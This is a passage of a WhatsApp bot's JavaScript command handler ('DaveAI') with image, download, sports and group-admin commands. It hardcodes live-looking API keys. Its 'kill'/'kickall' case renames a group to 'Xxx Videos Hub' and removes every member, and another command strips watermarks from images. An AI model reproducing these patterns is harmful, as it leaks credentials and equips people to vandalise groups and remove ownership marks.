    await fs.writeFileSync(cont, vcard.trim())
    await dave.sendMessage(m.chat, {
        document: fs.readFileSync(cont), 
        mimetype: 'text/vcard', 
        fileName: 'Group contacts.vcf', 
        caption: 'VCF for '+gcdata.subject+'\n👥 '+gcdata.participants.length+' contacts\n\n📱 Generated by 𝘿𝙖𝙫𝙚𝘼𝙄'
    }, {quoted: m})
    fs.unlinkSync(cont)
}
break

case 'toanime':
case 'toreal': {
  let media;
  try {
    if (!quoted || !/image/.test(mime))
      return reply(`Send or reply to an image with caption ${prefix + command}`);

    await dave.sendMessage(m.chat, { react: { text: '🚀', key: m.key } });

    const style = command === 'toanime' ? 'AnimageModel' : 'RealisticModel';
    media = await dave.downloadAndSaveMediaMessage(quoted);
    const imageUrl = await CatBox(media);

    if (!imageUrl) throw new Error('Failed to upload image');

    const apiUrl = `https://fastrestapis.fasturl.cloud/imgedit/aiimage?prompt=Anime&reffImage=${encodeURIComponent(imageUrl)}&style=${style}&width=1024&height=1024&creativity=0.5`;

    await dave.sendMessage(m.chat, { image: { url: apiUrl } }, { quoted: m });
  } catch (err) {
    console.error('toAnime Error:', err);
    reply('❌ An error occurred while processing the image');
  } finally {
    if (media) fs.promises.unlink(media).catch(() => {});
  }
}
break

case 'ocr': {
  try {
    await dave.sendMessage(m.chat, { react: { text: '🕒', key: m.key } });

    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    if (!mime.startsWith('image/')) throw new Error('Send or reply to an image');

    const media = await q.download();
    const ext = mime.split('/')[1] || 'jpg';
    const filename = `ocr.${ext}`;

    const Uguu = async (buffer, name) => {
      const FormData = require('form-data');
      const axios = require('axios');
      const form = new FormData();
      form.append('files[]', buffer, { filename: name });
      const { data } = await axios.post('https://uguu.se/upload.php', form, { headers: form.getHeaders() });
      if (!data.files?.[0]?.url) throw new Error('Upload failed');
      return data.files[0].url;
    };

    const imageUrl = await Uguu(media, filename);
    const { data } = await require('axios').get(`https://api.alyachan.dev/api/ocr?image=${imageUrl}&apikey=DinzIDgembul`);

    if (!data?.status || !data?.result?.text) throw new Error('OCR failed or no text found');
    reply(data.result.text.replace(/\r/g, '').trim());

    await dave.sendMessage(m.chat, { react: { text: '✅', key: m.key } });
  } catch (err) {
    console.error('OCR Error:', err);
    reply(typeof err === 'string' ? err : '❌ An error occurred while processing OCR');
  }
}
break

case 'removewatermark':
case 'nowatermark':
case 'remove-wm': {
  try {
    let q = m.quoted ? m.quoted : m;
    let mime = (q.msg || q).mimetype || '';
    if (!mime || !/image\/(jpe?g|png)/.test(mime)) 
      return reply(`Send or reply to an image with caption ${prefix + command}`);

    reply("Deleting watermark...");

    const imgData = await q.download();
    const { GoogleGenerativeAI } = require("@google-ai/generative");
    const genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");
    const base64Image = imgData.toString("base64");

    const contents = [
      { text: text || 'Remove watermark carefully' },
      { inlineData: { mimeType: mime, data: base64Image } }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] },
    });

    const response = await model.generateContent(contents);
    const parts = response?.response?.candidates?.[0]?.content?.parts || [];

    let resultImage;
    for (const part of parts) {
      if (part.inlineData?.data) {
        resultImage = Buffer.from(part.inlineData.data, "base64");
        break;
      }
    }

    if (!resultImage) throw new Error('Failed to remove watermark');

    const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
    fs.writeFileSync(tempPath, resultImage);

    await dave.sendMessage(m.chat, { image: { url: tempPath }, caption: '*Watermark removed successfully*' }, { quoted: m });
    setTimeout(() => fs.unlinkSync(tempPath).catch(() => {}), 30000);
  } catch (err) {
    console.error('Remove-WM Error:', err);
    reply('❌ An error occurred while removing watermark');
  }
}
break

case "edit-ai": {
  if (!text) return reply(`Where is the prompt?`);
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";

  if (!mime) return reply(`Send or reply to an image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);

  const promptText = text;
  reply("Please wait...");

  try {
    const imgData = await q.download();
    const base64Image = imgData.toString("base64");

    const { GoogleGenerativeAI } = require("@google-ai/generative");
    const genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");

    const contents = [
      { text: promptText },
      { inlineData: { mimeType: mime, data: base64Image } }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] },
    });

    const response = await model.generateContent(contents);
    const parts = response?.response?.candidates?.[0]?.content?.parts || [];

    let resultImage;
    for (const part of parts) {
      if (part.inlineData?.data) {
        resultImage = Buffer.from(part.inlineData.data, "base64");
        break;
      }
    }

    if (!resultImage) return reply("❌ Failed to generate edited image.");

    const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
    fs.writeFileSync(tempPath, resultImage);

    await dave.sendMessage(
      m.chat,
      { image: { url: tempPath }, caption: `*Result may not be perfect*` },
      { quoted: m }
    );

    setTimeout(() => { try { fs.unlinkSync(tempPath); } catch {} }, 30000);
  } catch (err) {
    console.error('Edit-AI Error:', err);
    reply('❌ An error occurred while editing the image.');
  }
}
break

case 'dave': {
    if (!text) return reply("Hello, how may I help you 🤷?");

    try {
        const url = `https://api.dreaded.site/api/aichat?query=${encodeURIComponent(text)}`;
        const response = await fetch(url);
        if (!response.ok) throw new Error(`HTTP ${response.status} - ${response.statusText}`);

        const data = await response.json();

        const aiReply = data.result || data.response || null;

        if (!aiReply) {
            return reply("❌ No response from AI. Try again later.");
        }

        const MAX_LENGTH = 4000;
        const finalReply = aiReply.length > MAX_LENGTH ? aiReply.slice(0, MAX_LENGTH) + "..." : aiReply;

        reply(`*𝘿𝙖𝙫𝙚𝘼𝙄:*\n\n${finalReply}`);
    } catch (error) {
        console.error('GPT Error:', error);
        reply("❌ An error occurred while communicating with the AI.\n" + (error.message || error));
    }
}
break

case "editanime": {
  let q = m.quoted ? m.quoted : m;
  let mime = (q.msg || q).mimetype || "";

  let defaultPrompt = `Change the character's skin color to black.`;

  if (!mime) return reply(`Send or reply to an image with caption *${prefix + command}*`);
  if (!/image\/(jpe?g|png)/.test(mime)) return reply(`Format ${mime} not supported! Only jpeg/jpg/png`);

  let promptText = text || defaultPrompt;

  reply("Please wait...");

  try {
    let imgData = await q.download();
    let genAI = new GoogleGenerativeAI("AIzaSyDE7R-5gnjgeqYGSMGiZVjA5VkSrQvile8");

    const base64Image = imgData.toString("base64");

    const contents = [
      { text: promptText },
      { inlineData: { mimeType: mime, data: base64Image } }
    ];

    const model = genAI.getGenerativeModel({
      model: "gemini-2.0-flash-exp-image-generation",
      generationConfig: { responseModalities: ["Text", "Image"] },
    });

    const response = await model.generateContent(contents);

    let resultImage;
    for (const part of response.response.candidates[0].content.parts) {
      if (part.inlineData) {
        const imageData = part.inlineData.data;
        resultImage = Buffer.from(imageData, "base64");
      }
    }

    if (resultImage) {
      const tempPath = path.join(process.cwd(), "lib", `gemini_${Date.now()}.png`);
      fs.writeFileSync(tempPath, resultImage);

      await dave.sendMessage(m.chat, { 
        image: { url: tempPath },
        caption: `*Sorry if the result isn't perfect*`
      }, { quoted: m });

      setTimeout(() => {
        try { fs.unlinkSync(tempPath); } catch {}
      }, 30000);
    } else {
      m.reply("Failed to edit image.");
    }
  } catch (error) {
    console.error(error);
    m.reply(`Error: ${error.message}`);
  }
}
break

case 'warning':
case 'warn': {
    if (!m.isGroup) reply(mess.group)
    if (!isAdmins) reply(mess.admin)

    let users = m.mentionedJid[0] ?
        m.mentionedJid[0] :
        m.quoted ?
        m.quoted.sender :
        text.replace(/[^0-9]/g, '') + '@s.whatsapp.net'

    if (!users) return reply(`Tag/Reply target with${command}`)
    if (!daveshown) return reply('feature reserved for owner or sudo numbers only')

    if (!db.data.chats[m.chat].warn) db.data.chats[m.chat].warn = {}
    db.data.chats[m.chat].warn[users] = (db.data.chats[m.chat].warn[users] || 0) + 1

    const total = db.data.chats[m.chat].warn[users]

    dave.sendTextWithMentions(m.chat, `⚠️ Success *${command}* @${users.split('@')[0]}\nTotal Warning: ${total}/3`, m)

    if (total >= setting.warnCount) {
        if (!isAdmins) return

        await dave.sendMessage(m.chat, {
            text: `🚫 @${users.split('@')[0]} your ${total}/${setting.warnCount} warning is on count.`,
            mentions: [users]
        })

        await dave.groupParticipantsUpdate(m.chat, [users], 'remove')
        delete db.data.chats[m.chat].warn[users]
    }
}
break

case 'autorecording': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
    if (q == 'on') {
        db.data.settings[botNumber].autoRecord = true
        reply(`Successfully Changed Auto Record To ${q}`)
    } else if (q == 'off') {
        db.data.settings[botNumber].autoRecord = false
        reply(`Successfully Changed Auto Record To ${q}`)
    }
}
break

case 'autobio': {
    if (!daveshown) return reply(mess.owner)
    if (args.length < 1) return reply(`Example ${prefix + command} on/off`)
    if (q == 'on') {
        db.data.settings[botNumber].autobio = true
        reply(`Successfully Changed Auto Bio To ${q}`)
    } else if (q == 'off') {
        db.data.settings[botNumber].autobio = false
        reply(`Successfully Changed Auto Bio To ${q}`)
    }
}
break

case "dev":
case "devoloper":
case "owner":
case "dave": {
  let namaown = `𝘿𝙖𝙫𝙚𝘼𝙄`
  let NoOwn = `254104260236`
  var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
    contactMessage: {
      displayName: namaown,
      vcard: `BEGIN:VCARD\nVERSION:3.0\nN:;;;;\nFN:${namaown}\nitem1.TEL;waid=${NoOwn}:+${NoOwn}\nitem1.X-ABLabel:Ponsel\nX-WA-BIZ-DESCRIPTION:The Nasty Dev🐉\nX-WA-BIZ-NAME:[[ ༑ 𝐙.𝐱.𝐕 ⿻ 𝐏𝐔𝐁𝐋𝐢𝐂 ༑ ]]\nEND:VCARD`
    }
  }), {
    userJid: m.chat,
    quoted: fkontak
  })
  dave.relayMessage(m.chat, contact.message, {
    messageId: contact.key.id
  })
}
break

case "invite": 
case "linkgc": { 
    if (!m.isGroup) return reply(mess.group); 
    let response = await dave.groupInviteCode(m.chat); 
    dave.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nGroup link for  ${groupMetadata.subject}`, m, { detectLink: true }); 
} 
break

case "close": {
    if (!m.isGroup) return reply(mess.group)
    if (!daveshown) return reply(mess.owner)
    await dave.groupSettingUpdate(m.chat, 'announcement')
    reply("Success closed group chat,all members are not allowed to chat for now")
}
break

case "open": {
    if (!m.isGroup) return reply(mess.group)
    if (!daveshown) return reply(mess.owner)
    await dave.groupSettingUpdate(m.chat, 'not_announcement')
    reply("Success opened group chat,all members can send messages in group now")
}
break

case 'tagall': {
    if (!m.isGroup) return (mess.group)
    if (!daveshown && !isAdmins) return reply(mess.owner)
    let teks = `*👥 Tag All By Admin*

@${m.chat}
 
Message: ${q ? q : 'no message'}`
    dave.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: participants.map(a => a.id),
            groupMentions: [{
                groupJid: m.chat,
                groupSubject: "everyone"
            }]
        }
    }, {
        quoted: m
    })
}
break

case 'h':
case 'hidetag': {
    if (!m.isGroup) return reply(mess.group)
    if (!daveshown) return reply(mess.owner)
    if (m.quoted) {
        dave.sendMessage(m.chat, {
            forward: m.quoted.fakeObj,
            mentions: participants.map(a => a.id)
        })
    }
    if (!m.quoted) {
        dave.sendMessage(m.chat, {
            text: q ? q : '',
            mentions: participants.map(a => a.id)
        }, {
            quoted: m
        })
    }
}
break

case 'welcome': {
  if (!m.isGroup) return reply(mess.group)
  if (!isAdmins) return reply(mess.admin)
  if (args[0] === "on") {
    if (db.data.chats[m.chat].welcome) return reply('Already activated previously')
    db.data.chats[m.chat].welcome = true
    reply('Successfully activated welcome!')
  } else if (args[0] === "off") {
    if (!db.data.chats[m.chat].welcome) return reply('Already deactivated previously')
    db.data.chats[m.chat].welcome = false
    reply('Successfully deactivated welcome!')
  } else {
    reply('Command not recognized. Use "on" to activate or "off" to deactivate.')
  }
}
break

case 'mbwaa':
case 'toka':
case 'remove': {
    if (!m.isGroup) return reply(mess.group)
    if (!daveshown) return reply(mess.owner)

    let target;
    if (m.mentionedJid?.[0]) {
        target = m.mentionedJid[0];
    } else if (m.quoted?.sender) {
        target = m.quoted.sender;
    } else if (args[0]) {
        const number = args[0].replace(/[^0-9]/g, '');
        if (!number) return reply(`Example: ${command} 254104260236`);
        target = `${number}@s.whatsapp.net`;
    } else {
        return reply(`Example: ${command} 254712345678`);
    }

    const botNumber = dave.user?.id || '';
    const ownerNumber = (config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');
    const ownerJid = ownerNumber ? `${ownerNumber}@s.whatsapp.net` : '';

    if (target === botNumber) return reply("I can't remove myself!");
    if (target === ownerJid) return reply("You can't remove my owner!");

    try {
        const result = await Promise.race([
            dave.groupParticipantsUpdate(from, [target], 'remove'),
            new Promise((_, reject) => setTimeout(() => reject(new Error("timeout")), 10000))
        ]);

        if (result && !result[0]?.status) {
            await reply(`Successfully removed @${target.split('@')[0]}`, { mentions: [target] });
        } else {
            reply("Couldn't remove this user. Maybe they're the group creator.");
        }

    } catch (err) {
        if (err.message === 'timeout') {
            reply("WhatsApp took too long to respond. Try again in a few seconds.");
        } else {
            console.error("Kick Error:", err);
            reply("Failed to remove member. Possibly due to permission issues or socket lag.");
        }
    }
}
break

case 'kick': {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins) return reply("bot must be admin first")
    if (!daveshown) return reply(mess.owner)
    let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
    await dave.groupParticipantsUpdate(m.chat, [users], 'remove')
    reply(`Sukses kick @${users.split('@')[0]}`)
}
break

case "kill": 
case "kickall": {
    if (!m.isGroup) return reply(mess.group)          
    if (!isAdmins) return reply(`bot is not admin in the group`)
    let raveni = participants.filter(_0x5202af => _0x5202af.id != dave.decodeJid(dave.user.id)).map(_0x3c0c18 => _0x3c0c18.id);

    reply("Initializing Kill command💀...");

    await dave.removeProfilePicture(m.chat);
    await dave.groupUpdateSubject(m.chat, "Xxx Videos Hub");
    await dave.groupUpdateDescription(m.chat, "//This group is no longer available 🥹!");

    setTimeout(() => {
        dave.sendMessage(m.chat, {
            'text': "All parameters are configured, and Kill command has been initialized and confirmed✅️. Now, all " + raveni.length + " group participants will be removed in the next second.\n\nGoodbye Everyone 👋\n\nTHIS PROCESS IS IRREVERSIBLE ⚠️"
        }, {
            'quoted': m
        });
        setTimeout(() => {
            dave.groupParticipantsUpdate(m.chat, raveni, "remove");
            setTimeout(() => {
                reply("Succesfully removed All group participants✅️.\n\nGoodbye group owner 👋, its too cold in here 🥶.");
                dave.groupLeave(m.chat);              
            }, 1000);
        }, 1000);
    }, 1000);
}              
break

case "promote": 
case "promot": {
    if (!m.isGroup) return reply(`for group only`)
    if (!isAdmins && !daveshown) return m.reply(`Command reserved for group admins only`)
    if (m.quoted || text) {
        let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
        await dave.groupParticipantsUpdate(m.chat, [target], 'promote').then((res) => reply(`User ${target.split("@")[0]} is now an admin`)).catch((err) => reply(err.toString()))
    } else return reply('Example: 254XXX/@tag')
}
break

case "demote": 
case "dismiss": {
    if (!m.isGroup) return reply(mess.group)
    if (!isAdmins && !daveshown) return m.reply(mess.admin)
    if (m.quoted || text) {
        let target = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
        await dave.groupParticipantsUpdate(m.chat, [target], 'demote').then((res) => reply(`Member ${target.split("@")[0]} is no longer an admin in this group`)).catch((err) => reply(err.toString()))
    } else return reply('example:254XX')
}
break

case 'ephoto': {
  try {
    const FormData = require('form-data');
    const axios = require('axios');
    const cheerio = require('cheerio');

    const effect = args[0]?.toLowerCase();
    const text = args.slice(1).join(' ');
    if (!effect || !text) return reply(
      "Usage: .ephoto <effect> <text>\n" +
      "Available effects: silver, gold, neon, shadow, glitch"
    );

    const effectMap = {
      silver: "https://ephoto360.com/effect/silver-text-effect.html",
      gold: "https://ephoto360.com/effect/gold-text-effect.html",
      neon: "https://ephoto360.com/effect/neon-text-effect.html",
      shadow: "https://ephoto360.com/effect/shadow-text-effect.html",
      glitch: "https://ephoto360.com/effect/glitch-text-effect.html"
    };

    const url = effectMap[effect];
    if (!url) return reply("Invalid effect! Check the list with available effects.");

    const form = new FormData();
    form.append('text[]', text);

    const { data } = await axios.post(url, form, {
      headers: form.getHeaders()
    });

    const $ = cheerio.load(data);
    const imgUrl = $('img#main_image').attr('src');
    if (!imgUrl) return reply("Failed to generate image!");

    await dave.sendMessage(from, { image: { url: imgUrl }, caption: `Your Ephoto (${effect}) result for: ${text}` });

  } catch (err) {
    console.error("Ephoto command error:", err);
    reply("Something went wrong while generating the Ephoto!");
  }
}
break

case "fixtures": 
case "matches": {
    try {
        let pl, laliga, bundesliga, serieA, ligue1;

        const plData = await fetchJson('https://api.dreaded.site/api/matches/PL');
        pl = plData.data;

        const laligaData = await fetchJson('https://api.dreaded.site/api/matches/PD');
        laliga = laligaData.data;

        const bundesligaData = await fetchJson('https://api.dreaded.site/api/matches/BL1');
        bundesliga = bundesligaData.data;

        const serieAData = await fetchJson('https://api.dreaded.site/api/matches/SA');
        serieA = serieAData.data;

        const ligue1Data = await fetchJson('https://api.dreaded.site/api/matches/FR');
        ligue1 = ligue1Data.data;

        let message = `𝗧𝗼𝗱𝗮𝘆𝘀 𝗙𝗼𝗼𝘁𝗯𝗮𝗹𝗹 𝗙𝗶𝘅𝘁𝘂𝗿𝗲𝘀 ⚽\n\n`;

        message += typeof pl === 'string' ? `🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲:\n${pl}\n\n` : pl.length > 0 ? `🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲:\n${pl.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇬🇧 𝗣𝗿𝗲𝗺𝗶𝗲𝗿 𝗟𝗲𝗮𝗴𝘂𝗲: No matches scheduled\n\n";

        if (typeof laliga === 'string') {
            message += `🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮:\n${laliga}\n\n`;
        } else {
            message += laliga.length > 0 ? `🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮:\n${laliga.map(match => {
                const { game, date, time } = match;
                return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
            }).join('\n')}\n\n` : "🇪🇸 𝗟𝗮 𝗟𝗶𝗴𝗮: No matches scheduled\n\n";
        }

        message += typeof bundesliga === 'string' ? `🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮:\n${bundesliga}\n\n` : bundesliga.length > 0 ? `🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮:\n${bundesliga.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇩🇪 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮: No matches scheduled\n\n";

        message += typeof serieA === 'string' ? `🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔:\n${serieA}\n\n` : serieA.length > 0 ? `🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔:\n${serieA.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇮🇹 𝗦𝗲𝗿𝗶𝗲 𝗔: No matches scheduled\n\n";

        message += typeof ligue1 === 'string' ? `🇫🇷 𝗟𝗶𝗴𝘂𝗲 1:\n${ligue1}\n\n` : ligue1.length > 0 ? `🇫🇷 𝗟𝗶𝗴𝘂𝗲 1:\n${ligue1.map(match => {
            const { game, date, time } = match;
            return `${game}\nDate: ${date}\nTime: ${time} (EAT)\n`;
        }).join('\n')}\n\n` : "🇫🇷 𝗟𝗶𝗴𝘂𝗲- 1: No matches scheduled\n\n";

        message += "𝗧𝗶𝗺𝗲 𝗮𝗻𝗱 𝗗𝗮𝘁𝗲 𝗮𝗿𝗲 𝗶𝗻 𝗘𝗮𝘀𝘁 𝗔𝗳𝗿𝗶𝗰𝗮 𝗧𝗶𝗺𝗲𝘇𝗼𝗻𝗲 (𝗘𝗔𝗧).";

        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch matches.' + error);
    }
}
break

case 'request': 
case 'suggest': {
  if (!text) return reply(`Example : ${prefix + command} hi dev play command is not working`)
  let textt = `*| REQUEST/SUGGESTION |*`
  let teks1 = `\n\n*User* : @${m.sender.split("@")[0]}\n*Request/Bug* : ${text}`
  let teks2 = `\n\n*Hii ${pushname},You request has been forwarded to the support group*.\n*Please wait...*`
  const groupId = '120363231160993583@g.us';
  dave.sendMessage(groupId, {
    text: textt + teks1,
    mentions: [m.sender],
  }, { quoted: m })
  dave.sendMessage(m.chat, {
    text: textt + teks2 + teks1,
    mentions: [m.sender],
  }, { quoted: m })
}
break

case 'fb': 
case 'facebook': 
case 'fbdl':
case 'ig': 
case 'instagram': 
case 'igdl': {
    if (!args[0]) return reply("🔗 provide a fb or ig link!");
    try {
        const axios = require('axios');
        const cheerio = require('cheerio');
        async function yt5sIo(url) {
            try {
                const form = new URLSearchParams();
                form.append("q", url);
                form.append("vt", "home");
                const { data } = await axios.post('https://yt5s.io/api/ajaxSearch', form, {
                    headers: {
                        "Accept": "application/json",
                        "X-Requested-With": "XMLHttpRequest",
                        "Content-Type": "application/x-www-form-urlencoded",
                    },
                });
                if (data.status !== "ok") throw new Error("provide a valid link.");
                const $ = cheerio.load(data.data); 
                if (/^(https?:\/\/)?(www\.)?(facebook\.com|fb\.watch)\/.+/i.test(url)) {
                    const thumb = $('img').attr("src");
                    let links = [];
                    $('table tbody tr').each((_, el) => {
                        const quality = $(el).find('.video-quality').text().trim();
                        const link = $(el).find('a.download-link-fb').attr("href");
                        if (quality && link) links.push({ quality, link });
                    });
                    if (links.length > 0) {
                        return { platform: "facebook", type: "video", thumb, media: links[0].link };
                    } else if (thumb) {
                        return { platform: "facebook", type: "image", media: thumb };
                    } else {
                        throw new Error("media is invalid.");
                    }
                } else if (/^(https?:\/\/)?(www\.)?(instagram\.com\/(p|reel)\/).+/i.test(url)) {
                    const video = $('a[title="Download Video"]').attr("href");
                    const image = $('img').attr("src");
                    if (video) {
                        return { platform: "instagram", type: "video", media: video };
                    } else if (image) {
                        return { platform: "instagram", type: "image", media: image };
                    } else {
                        throw new Error("Media invalid.");
                    }
                } else {
                    throw new Error("provide a valid url or link.");
                }
            } catch (error) {
                return { error: error.message };
            }
        }
        await dave.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key,
            }
        });
        let res = await yt5sIo(args[0]);
        if (res.error) {
            await dave.sendMessage(m.chat, {
                react: {
                    text: "❌",
                    key: m.key,
                }
            });
            return reply(`⚠ *Error:* ${res.error}`);
        }
        if (res.type === "video") {
            await dave.sendMessage(m.chat, {
                react: {
                    text: "⏳",
                    key: m.key,
                }
            });
            await dave.sendMessage(m.chat, { video: { url: res.media }, caption: "✅ *𝘿𝙖𝙫𝙚𝘼𝙄 is on fire 🔥!*" }, { quoted: m });
        } else if (res.type === "image") {
            await dave.sendMessage(m.chat, {
                react: {
                    text: "⏳",
                    key: m.key,
                }
            });
            await dave.sendMessage(m.chat, { image: { url: res.media }, caption: "✅ 𝘿𝙖𝙫𝙚𝘼𝙄 is on fire 🔥!*" }, { quoted: m });
        }
    } catch (error) {
        console.error(error);
        await dave.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key,
            }
        });
        reply("failed to get media.");
    }
}
break

case 'tiktok': {
    if (!text) return reply(`Use : ${prefix + command} link`)
    trashreply(mess.wait)
    let data = await fg.tiktok(text)
    let json = data.result
    let caption = `[ TIKTOK - DOWNLOAD ]\n\n`
    caption += `◦ *Id* : ${json.id}\n`
    caption += `◦ *Username* : ${json.author.nickname}\n`
    caption += `◦ *Title* : ${(json.title)}\n`
    caption += `◦ *Like* : ${(json.digg_count)}\n`
    caption += `◦ *Comments* : ${(json.comment_count)}\n`
    caption += `◦ *Share* : ${(json.share_count)}\n`
    caption += `◦ *Play* : ${(json.play_count)}\n`
    caption += `◦ *Created* : ${json.create_time}\n`
    caption += `◦ *Size* : ${json.size}\n`
    caption += `◦ *Duration* : ${json.duration}`
    if (json.images) {
        json.images.forEach(async (k) => {
            await dave.sendMessage(m.chat, { image: { url: k }}, { quoted: m });
        })
    } else {
        dave.sendMessage(m.chat, { video: { url: json.play }, mimetype: 'video/mp4', caption: caption }, { quoted: m })
        setTimeout(() => {
            dave.sendMessage(m.chat, { audio: { url: json.music }, mimetype: 'audio/mpeg' }, { quoted: m })
        }, 3000)
    }
}
break

case "disp-7": { 
    if (!m.isGroup) return reply(mess.group); 
    if (!isAdmins) return reply(mess.admin); 
    await dave.groupToggleEphemeral(m.chat, 7*24*3600); 
    m.reply('Dissapearing messages successfully turned on for 7 days!'); 
} 
break

case 'idch': 
case 'cekidch': {
    if (!text) return reply("channel link?")
    if (!text.includes("https://whatsapp.com/channel/")) return reply("Link must be valid")
    let result = text.split('https://whatsapp.com/channel/')[1]
    let res = await dave.newsletterMetadata("invite", result)
    let teks = `* *ID : ${res.id}*
* *Name :* ${res.name}
* *Total Followers :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}`
    let msg = generateWAMessageFromContent(m.chat, {
        viewOnceMessage: {
            message: { "messageContextInfo": { "deviceListMetadata": {}, "deviceListMetadataVersion": 2 },
                interactiveMessage: {
                    body: {
                        text: teks 
                    }, 
                    footer: {
                        text: "𝘿𝙖𝙫𝙚𝘼𝙄"
                    },
                    nativeFlowMessage: {
                        buttons: [
                            {
                                "name": "cta_copy",
                                "buttonParamsJson": `{"display_text": "copy ID","copy_code": "${res.id}"}`
                            },
                        ],
                    },
                },
            }, 
        }, 
    },{ quoted : fkontak });
    await dave.relayMessage( msg.key.remoteJid,msg.message,{ messageId: msg.key.id });
}
break

case "epl": 
case "epl-table": {
    try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/PL');
        const standings = data.data;
        const message = ` 𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗘𝗽𝗹 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀:-\n\n${standings}`;
        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗘𝗽𝗹 standings.');
    }
}
break

case "laliga": 
case "pd-table": {
    try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/PD');
        const standings = data.data;
        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗟𝗮𝗹𝗶𝗴𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀:-\n\n${standings}`;
        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗟𝗮𝗹𝗶𝗴𝗮 standings.');
    }
}   
break

case "bundesliga": 
case "bl-table": {
    try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/BL1');
        const standings = data.data;
        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗕𝘂𝗻𝗱𝗲𝘀𝗹𝗶𝗴𝗮 standings.');
    }
}
break

case "ligue-1": 
case "lg-1": {
    try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/FL1');
        const standings = data.data;
        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗟𝗶𝗴𝘂𝗲-1 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗹𝗶𝗴𝘂𝗲-1 standings.');
    }
}
break

case "serie-a": 
case "sa-table":{
    try {
        const data = await fetchJson('https://api.dreaded.site/api/standings/SA');
        const standings = data.data;
        const message = `𝗖𝘂𝗿𝗿𝗲𝗻𝘁 𝗦𝗲𝗿𝗶𝗲-𝗮 𝗧𝗮𝗯𝗹𝗲 𝗦𝘁𝗮𝗻𝗱𝗶𝗻𝗴𝘀\n\n${standings}`;
        await m.reply(message);
    } catch (error) {
        m.reply('Something went wrong. Unable to fetch 𝗦𝗲𝗿𝗶𝗲-𝗮 standings.');
    }
}
break

case 'enc':
case 'encrypt': {
    const JsConfuser = require('js-confuser')

    if (!m.message.extendedTextMessage || !m.message.extendedTextMessage.contextInfo.quotedMessage) {
        return reply('❌ Please Reply File To Be Encryption.');
    }
    const quotedMessage = m.message.extendedTextMessage.contextInfo.quotedMessage;
    const quotedDocument = quotedMessage.documentMessage;
    if (!quotedDocument || !quotedDocument.fileName.endsWith('.js')) {
